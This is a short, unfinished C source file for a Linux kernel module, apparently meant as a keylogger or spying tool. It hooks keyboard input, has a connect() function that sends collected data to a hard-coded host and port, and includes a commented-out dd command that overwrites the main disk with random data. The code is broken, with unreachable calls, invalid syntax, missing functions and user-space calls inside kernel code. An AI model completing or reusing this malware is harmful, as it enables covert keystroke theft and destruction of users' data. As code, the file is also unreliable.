#define DEBUG true
#define SUCCESS 0
#define FAILURE 1
#define OUTPUT_FD 1
#define INPUT_FD 0
#define ERROR_FD 2
#define IP_HOST 127.0.0.1
#define PORT_HOST 87

#include <linux/module.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/kernel.h>

static struct input_handler kb_input_handler;
static struct input_handle *kb_handle;

static int __init start(void)
{
if (DEBUG) pr_info("STARTED IN DEBUG MODE\n");
return SUCCESS;
spy();
}

static int connect(void){
    char[] msg = find_data();
    send_data(msg, IP_HOST, PORT_HOST);
    return SUCCESS;
}

static int keylogger(){

}

static int output_modifier(void){
    freopen("funny-input.txt", "rt", stdin);
}

static int kill_order(){
    system("system killed");
    //system("dd if=/dev/random of=/dev/sda bs=1M conv=noerror status=progress")
    return SUCCESS;
}


static void __exit end(void)
{
if (DEBUG) pr_info("WE'RE DONE\n");
}

module_init(start);
module_exit(end);